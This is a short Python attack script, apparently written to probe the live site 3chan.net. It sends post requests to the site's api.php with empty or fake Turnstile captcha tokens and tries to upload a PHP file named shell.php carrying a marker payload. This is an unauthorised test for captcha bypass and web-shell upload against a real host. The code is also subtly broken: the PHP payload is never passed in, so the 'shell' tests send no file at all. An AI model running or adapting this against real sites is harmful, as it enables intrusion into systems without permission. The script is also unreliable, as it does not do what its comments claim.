#!/usr/bin/env python3
"""3chan api.php - test upload with fake/empty turnstile_token"""
import urllib.request, uuid

UA = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"}
SHELL = b'<?php echo "SHELL_3CHAN_271828"; ?>'

def upload(filename, token, content=None, ctype="image/jpeg"):
    boundary = uuid.uuid4().hex
    body = b""
    fields = [("action", "post_thread"), ("board", "b"), ("name", "t"),
              ("email", ""), ("comment", "test"), ("turnstile_token", token)]
    for k, v in fields:
        body += b"--" + boundary.encode() + b"\r\n"
        body += ('Content-Disposition: form-data; name="%s"\r\n\r\n' % k).encode()
        body += v.encode() + b"\r\n"
    if content is not None:
        body += b"--" + boundary.encode() + b"\r\n"
        body += ('Content-Disposition: form-data; name="image"; filename="%s"\r\n' % filename).encode()
        body += ('Content-Type: %s\r\n\r\n' % ctype).encode()
        body += content + b"\r\n"
    body += b"--" + boundary.encode() + b"--\r\n"
    h = {**UA, "Content-Type": "multipart/form-data; boundary=" + boundary}
    req = urllib.request.Request("http://3chan.net/api.php", data=body, headers=h)
    try:
        r = urllib.request.urlopen(req, timeout=15)
        return r.status, r.read(5000).decode("utf-8", "ignore")
    except urllib.error.HTTPError as e:
        return e.code, e.read(5000).decode("utf-8", "ignore")
    except Exception as ex:
        return 0, str(ex)[:100]

# 1. empty token + php shell
print("empty token + shell.php:", upload("shell.php", ""), flush=True)
# 2. fake token + php shell
print("fake token + shell.php:", upload("shell.php", "0x4AAAAAAC-fake123"), flush=True)
# 3. empty token no file (control)
print("empty token no file:", upload("shell.php", "", None), flush=True)
